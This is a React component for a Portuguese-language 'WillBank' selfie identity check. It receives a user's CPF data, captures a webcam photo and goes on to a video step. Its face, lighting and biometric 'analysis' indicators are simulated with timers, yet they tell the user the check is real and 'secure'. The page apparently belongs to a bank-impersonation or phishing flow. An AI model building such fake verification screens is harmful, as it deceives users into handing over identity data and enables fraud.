import { useEffect, useState, useRef, useCallback } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Camera, CheckCircle, AlertCircle, Sun, User } from "lucide-react";
import { Button } from "@/components/ui/button";
import WillBankHeader from "@/components/WillBankHeader";
import WillBankCard from "@/components/WillBankCard";
import WillBankFooter from "@/components/WillBankFooter";
import { CPFData } from "@/lib/cpf";

const Biometria = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  
  const [stream, setStream] = useState<MediaStream | null>(null);
  const [cameraError, setCameraError] = useState<string | null>(null);
  const [capturedPhoto, setCapturedPhoto] = useState<string | null>(null);
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [analysisProgress, setAnalysisProgress] = useState(0);
  const [validationStatus, setValidationStatus] = useState<{
    face: boolean;
    lighting: boolean;
  }>({ face: false, lighting: false });

  const cpfData: CPFData | undefined = location.state?.cpfData;

  useEffect(() => {
    if (!cpfData) {
      navigate("/");
      return;
    }

    // Start camera
    startCamera();

    return () => {
      // Cleanup camera on unmount
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    };
  }, [cpfData, navigate]);

  const startCamera = async () => {
    try {
      const mediaStream = await navigator.mediaDevices.getUserMedia({
        video: { 
          facingMode: "user",
          width: { ideal: 640 },
          height: { ideal: 480 }
        }
      });
      
      setStream(mediaStream);
      if (videoRef.current) {
        videoRef.current.srcObject = mediaStream;
      }
      setCameraError(null);
      
      // Simulate face/lighting detection after camera starts
      setTimeout(() => {
        setValidationStatus({ face: true, lighting: false });
        setTimeout(() => {
          setValidationStatus({ face: true, lighting: true });
        }, 1500);
      }, 2000);
      
    } catch (error) {
      console.error("Camera error:", error);
      setCameraError("Não foi possível acessar a câmera. Verifique as permissões.");
    }
  };

  const capturePhoto = useCallback(() => {
    if (!videoRef.current || !canvasRef.current) return;

    const video = videoRef.current;
    const canvas = canvasRef.current;
    const context = canvas.getContext('2d');
    
    if (!context) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    // Draw video frame to canvas (mirrored)
    context.translate(canvas.width, 0);
    context.scale(-1, 1);
    context.drawImage(video, 0, 0);
    
    // Get image data
    const photoData = canvas.toDataURL('image/jpeg', 0.8);
    setCapturedPhoto(photoData);
    
    // Stop camera
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
    }
    
    // Start analysis animation
    setIsAnalyzing(true);
    simulateAnalysis();
  }, [stream]);

  const simulateAnalysis = () => {
    let progress = 0;
    const interval = setInterval(() => {
      progress += 3;
      setAnalysisProgress(progress);
      
      if (progress >= 100) {
        clearInterval(interval);
        setTimeout(() => {
          navigate("/video", { state: { cpfData } });
        }, 800);
      }
    }, 80);
  };

  const retakePhoto = () => {
    setCapturedPhoto(null);
    setIsAnalyzing(false);
    setAnalysisProgress(0);
    setValidationStatus({ face: false, lighting: false });
    startCamera();
  };

  if (!cpfData) return null;

  const canCapture = validationStatus.face && validationStatus.lighting;

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <WillBankHeader 
        userName={cpfData.nome.split(' ')[0].toUpperCase()} 
      />

      <main className="flex-1 flex items-center justify-center p-4 sm:p-6">
        <WillBankCard className="w-full max-w-lg">
          <div className="space-y-6 text-center py-4">
            <div className="space-y-2">
              <h1 className="text-2xl sm:text-3xl font-bold text-foreground tracking-tight">
                Verificação de identidade
              </h1>
              <p className="text-muted-foreground leading-relaxed text-sm sm:text-base">
                {capturedPhoto 
                  ? "Analisando sua foto..."
                  : `Tire uma selfie para confirmar que é ${cpfData.nome.split(' ')[0]}`
                }
              </p>
            </div>

            {/* Camera/Photo Area */}
            <div className="relative mx-auto w-full max-w-[300px] aspect-[3/4]">
              {cameraError ? (
                <div className="absolute inset-0 bg-muted rounded-3xl flex flex-col items-center justify-center p-6">
                  <AlertCircle className="w-12 h-12 text-destructive mb-4" />
                  <p className="text-sm text-muted-foreground text-center">{cameraError}</p>
                  <Button 
                    onClick={startCamera} 
                    className="mt-4"
                    variant="outline"
                  >
                    Tentar novamente
                  </Button>
                </div>
              ) : capturedPhoto ? (
                // Show captured photo
                <div className="absolute inset-0 rounded-3xl overflow-hidden">
                  <img 
                    src={capturedPhoto} 
                    alt="Foto capturada" 
                    className="w-full h-full object-cover"
                  />
                  {isAnalyzing && (
                    <div className="absolute inset-0 bg-black/60 flex flex-col items-center justify-center">
                      <div className="w-20 h-20 rounded-full border-4 border-primary/30 border-t-primary animate-spin mb-4" />
                      <p className="text-white font-semibold mb-2">Analisando biometria facial</p>
                      <p className="text-white/80 text-2xl font-bold">{analysisProgress}%</p>
                    </div>
                  )}
                </div>
              ) : (
                // Show camera feed
                <>
                  <video 
                    ref={videoRef}
                    autoPlay 
                    playsInline 
                    muted
                    className="absolute inset-0 w-full h-full object-cover rounded-3xl transform scale-x-[-1]"
                  />
                  
                  {/* Face oval overlay */}
                  <div className="absolute inset-0 pointer-events-none">
                    <svg className="w-full h-full" viewBox="0 0 300 400">
                      {/* Dark overlay with transparent oval cutout */}
                      <defs>
                        <mask id="faceMask">
                          <rect width="100%" height="100%" fill="white" />
                          <ellipse cx="150" cy="180" rx="90" ry="120" fill="black" />
                        </mask>
                      </defs>
                      <rect 
                        width="100%" 
                        height="100%" 
                        fill="rgba(0,0,0,0.5)" 
                        mask="url(#faceMask)" 
                        rx="24"
                      />
                      {/* Animated oval border */}
                      <ellipse 
                        cx="150" 
                        cy="180" 
                        rx="90" 
                        ry="120" 
                        fill="none" 
                        stroke={canCapture ? "hsl(var(--primary))" : "white"}
                        strokeWidth="3"
                        strokeDasharray={canCapture ? "0" : "10 5"}
                        className={canCapture ? "" : "animate-pulse"}
                      />
                    </svg>
                  </div>

                  {/* Instructions */}
                  <div className="absolute bottom-4 left-4 right-4 bg-black/70 backdrop-blur rounded-xl p-3">
                    <p className="text-white text-sm font-medium text-center">
                      Posicione seu rosto no centro
                    </p>
                  </div>
                </>
              )}
              
              <canvas ref={canvasRef} className="hidden" />
            </div>

            {/* Validation Indicators */}
            {!capturedPhoto && !cameraError && (
              <div className="flex justify-center gap-6">
                <div className={`flex items-center gap-2 px-4 py-2 rounded-full transition-all ${
                  validationStatus.face 
                    ? 'bg-green-500/20 text-green-600' 
                    : 'bg-muted text-muted-foreground'
                }`}>
                  <User className="w-4 h-4" />
                  <span className="text-sm font-medium">
                    {validationStatus.face ? 'Rosto detectado' : 'Detectando rosto...'}
                  </span>
                  {validationStatus.face && <CheckCircle className="w-4 h-4" />}
                </div>
                
                <div className={`flex items-center gap-2 px-4 py-2 rounded-full transition-all ${
                  validationStatus.lighting 
                    ? 'bg-green-500/20 text-green-600' 
                    : 'bg-muted text-muted-foreground'
                }`}>
                  <Sun className="w-4 h-4" />
                  <span className="text-sm font-medium">
                    {validationStatus.lighting ? 'Iluminação OK' : 'Verificando luz...'}
                  </span>
                  {validationStatus.lighting && <CheckCircle className="w-4 h-4" />}
                </div>
              </div>
            )}

            {/* Action Buttons */}
            {!capturedPhoto && !cameraError && (
              <Button 
                onClick={capturePhoto}
                disabled={!canCapture}
                className="w-full h-14 text-base font-bold bg-primary hover:bg-primary/90 text-primary-foreground rounded-full shadow-lg hover:shadow-xl transition-all duration-300 disabled:opacity-50"
              >
                <Camera className="w-5 h-5 mr-2" />
                {canCapture ? 'Tirar foto' : 'Aguarde a validação...'}
              </Button>
            )}

            {capturedPhoto && !isAnalyzing && (
              <div className="flex gap-3">
                <Button 
                  onClick={retakePhoto}
                  variant="outline"
                  className="flex-1 h-12 font-semibold rounded-full"
                >
                  Tirar novamente
                </Button>
                <Button 
                  onClick={() => {
                    setIsAnalyzing(true);
                    simulateAnalysis();
                  }}
                  className="flex-1 h-12 font-bold bg-primary hover:bg-primary/90 rounded-full"
                >
                  Confirmar foto
                </Button>
              </div>
            )}

            {/* Security Badge */}
            <div className="inline-flex items-center gap-2.5 bg-primary/10 text-primary px-5 py-2.5 rounded-full text-sm font-semibold">
              <span>🔒</span>
              <span>Verificação facial segura</span>
            </div>
          </div>
        </WillBankCard>
      </main>

      <WillBankFooter />
    </div>
  );
};

export default Biometria;
